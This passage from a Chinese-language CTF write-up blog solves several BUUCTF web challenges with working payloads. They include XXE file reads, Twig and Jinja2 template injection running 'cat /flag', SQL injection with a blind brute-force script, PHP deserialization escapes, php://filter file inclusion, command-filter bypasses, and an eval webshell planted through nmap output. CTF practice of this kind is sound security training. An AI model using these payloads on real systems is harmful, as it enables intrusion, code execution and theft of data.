class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /L0g1n.php HTTP/1.1</span><br><span class="line">Host: node3.buuoj.cn:25749</span><br><span class="line">User-Agent: Commodore 64</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: gem-love.com</span><br><span class="line">Client-ip:127.0.0.1</span><br><span class="line">From:root@gem-love.com</span><br><span class="line">Via: y1ng.vip</span><br><span class="line">Cookie: time=16087393622222222225; PHPSESSID=se1334rkn9800qh7bk8dtnpn64</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p>相关头部信息<br><img src="../../images/ctf/buuctf/16.png" alt=""><br><img src="../../images/ctf/buuctf/17.png" alt=""></p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>xxe漏洞 file 协议读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY penson SYSTEM <span class="string">"file:///flag"</span> &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;penson&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>买第四个商品了</p><p>考点unicode编码安全问题</p><p>我们可以用别的语言来表示数字</p><p>搜uncode大于1337的字符<a href="https://www.compart.com/en/unicode/search?q=thousand#characters" target="_blank" rel="noopener">https://www.compart.com/en/unicode/search?q=thousand#characters</a><br>直接搜thousand，会有一大堆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=4&amp;price=%E2%86%82</span><br></pre></td></tr></table></figure><h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>题目源码  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure><p>解题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">65537</span>):    </span><br><span class="line">    tmp=chr(i)    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        res = tmp.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>)        </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"-"</span>) <span class="keyword">in</span> res:            </span><br><span class="line">            <span class="keyword">continue</span>        </span><br><span class="line">        print(<span class="string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>在这里插入图片描述<br>Nginx 重要文件目录</p><p>配置文件存放目录：/etc/nginx<br>主要配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>Nginx配置文件：/usr/local/nginx/conf/nginx.conf           </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cℭ/usr/<span class="built_in">local</span>/nginx/conf/nginx.conf</span><br><span class="line">file://suctf.cℭ/usr/fffffflag</span><br></pre></td></tr></table></figure><h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><p>反序列化字符逃匿，字符变长<br>注册账户<br>登录账户<br>随意提交一些资料抓包<br>修改nickname为nickname[]，数组绕过strlen()长度检测<br>修改nickname中的内容   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSerialize</span><span class="params">()</span></span>&#123;</span><br><span class="line">$profile[<span class="string">'phone'</span>] = <span class="string">'111111111111'</span>;</span><br><span class="line">$profile[<span class="string">'email'</span>] = <span class="string">"11112@qq.com"</span>;</span><br><span class="line">$profile[<span class="string">'nickname'</span>]  = <span class="keyword">array</span>(<span class="string">"sdddd"</span> );</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">return</span> serialize($profile);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPayload</span><span class="params">()</span></span>&#123;</span><br><span class="line">$s=<span class="string">'";&#125;s:5:"photo";s:10:"config.php";&#125;'</span>;</span><br><span class="line">$len=strlen($s);</span><br><span class="line">$result=<span class="string">""</span>;</span><br><span class="line">$padding=<span class="string">"where"</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$len;$i++)&#123;</span><br><span class="line">$result.=$padding;</span><br><span class="line">&#125;</span><br><span class="line">$result.=$s;</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>(getSerialize());</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">print</span>(getPayload());</span><br><span class="line"><span class="comment">#a:4:&#123;s:5:"phone";s:12:"111111111111";s:5:"email";s:12:"11112@qq.com";s:8:"nickname";a:1:&#123;i:0;s:5:"sdddd";&#125;s:5:"photo";s:10:"config.php";&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";&#125;s:5:"photo";s:10:"config.php";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/buuctf/18.jpg" alt=""><br><img src="../../images/ctf/buuctf/19.jpg" alt=""></p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>在user处尝试注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*<span class="string">'7'</span>&#125;&#125; 回显7777777 ==&gt; Jinja2</span><br><span class="line">&#123;&#123;7*<span class="string">'7'</span>&#125;&#125; 回显49 ==&gt; Twig </span><br><span class="line">``` </span><br><span class="line">这里为Twig</span><br><span class="line">获取flag</span><br><span class="line">```bash</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"><span class="meta">@ app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@ app.route('/shrine/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) +  s</span><br><span class="line"><span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这里过滤了括号，所以<code>__subclasses__</code> 就无法使用，其中黑名单处理会将config和self替换为None,不过可以使用其他全局变量，再来引用config,如url_for()和get_flashed_messages() </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>报错了<br>一通fuzz，or等被过滤，即无法使用information_schema库，可以使用无列名注入<br>构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span>22</span><br></pre></td></tr></table></figure><p>手动探测列数，这里探测到有22列，回显位为2和3<br>查表名时由于过滤or，所以information_schema无法使用。<br>但Mysql5.6及以上版本中mysql的 innodb_index_stats 和innodb_table_stats这两个表中都包含所有新创建的数据库和表名 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span>22</span><br></pre></td></tr></table></figure><p>无列名注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select * from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span>22</span><br></pre></td></tr></table></figure><h1 id="2019-easy-serialize-php"><a href="#2019-easy-serialize-php" class="headerlink" title="[2019]easy_serialize_php"></a>[2019]easy_serialize_php</h1><p>反序列化字符逃匿，字符减少<br>由 phpinfo  的 auto_append_file 中得知 flag 的位置 /d0g3_fllllllag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?f=show_image</span><br><span class="line">post: _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"L2QwZzNfZmxsbGxsbGFn"</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>读取index.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure><p>index</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">'category'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( strpos( $file, <span class="string">"woofers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"meowers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"index"</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> ($file . <span class="string">'.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, we currently only support woofers and meowers."</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得去flag.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=meowers/../flag</span><br></pre></td></tr></table></figure><h1 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h1><p>hint.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password <span class="keyword">then</span> u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users <span class="built_in">where</span> username=<span class="string">'$_POST["username"]'</span> and password=<span class="string">'$_POST["password"]'</span>;</span><br><span class="line"></span><br><span class="line">//出题人四级压线才过 见谅见谅 领会精神</span><br></pre></td></tr></table></figure><p>fuzz过滤的字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'--'</span>, <span class="string">'&amp;'</span>, <span class="string">"'"</span>, <span class="string">'and'</span>, <span class="string">'like'</span>, <span class="string">'select'</span>, <span class="string">'-~'</span>, <span class="string">';'</span>, <span class="string">'='</span>, <span class="string">'"'</span>, <span class="string">'union'</span>, <span class="string">'mid'</span>]</span><br></pre></td></tr></table></figure><p>注入点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> username=<span class="string">'admin\'</span> and password=<span class="string">'or 1#'</span>;</span><br></pre></td></tr></table></figure><p>这时的后台语句变成这样的，用反斜杠转义username后面那个单引号，所以username的第一个单引号只能与password的第一个单引号闭合，最后一个单引号被注释，所以or后面那块就可以由我们自由发挥了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://ff2e7e0b-61b7-45a5-927d-1a759757182e.node3.buuoj.cn/'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">32</span>):</span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid=math.floor((high+low)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> low&lt;high:</span><br><span class="line">        payload = <span class="string">"or(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;)#"</span>.format(i, mid)</span><br><span class="line">        data = &#123;<span class="string">"username"</span>: <span class="string">"admin\\"</span>, <span class="string">"password"</span>: payload&#125;</span><br><span class="line">        re = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"stronger"</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            high=mid</span><br><span class="line">        mid=math.floor((high+low)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> (low == <span class="number">32</span> <span class="keyword">or</span> high == <span class="number">128</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>不过没注入出正确的密码有点奇怪</p><h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><p>robots.txt 得知 fAke_f1agggg.php 文件，访问一个假flag，响应头部有提示 fl4g.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>level1   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval(<span class="variable">$num</span>) &lt; 2020 &amp;&amp; intval(<span class="variable">$num</span> + 1) &gt; 2021</span><br></pre></td></tr></table></figure><p>这里传入num=1e7即可。<br>在进行intval($num)时被截断成为1，1&lt;2020 =&gt; True;<br>而$num+1时就解析为科学技术法，结果是10000001（也不知道位数对不对，随意啦）。<br>绕过了。   </p><p>level2    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">'md5'</span>];</span><br></pre></td></tr></table></figure><p>一般绕过md5的方法有两种，一个是以0e开头，后面全是数字的结果，这个会被解析为科学计数法为0；另一个是利用数组绕过。<br>这里利用0e绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">'0e215962017'</span>) ==&gt; “0e291242476940776845150308577824”</span><br></pre></td></tr></table></figure><p>get flag<br>这里是个RCE，过滤了空格和cat。<br>空格用%09(tab)绕过，cat用反斜杠绕过，构造成ca\t:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fl4g.php?num=1e7&amp;md5=0e215962017&amp;get_flag=ca\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>回显hacker，经查，php被过滤，使用短标签绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' &lt;?= @eval($_POST["hack"]);?&gt; -oG hack.phtml '</span></span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><h1 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h1><p>前端验证，直接访问/flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">(code)</span></span>&#123;</span><br><span class="line">  hash = hex_md5(code);</span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span 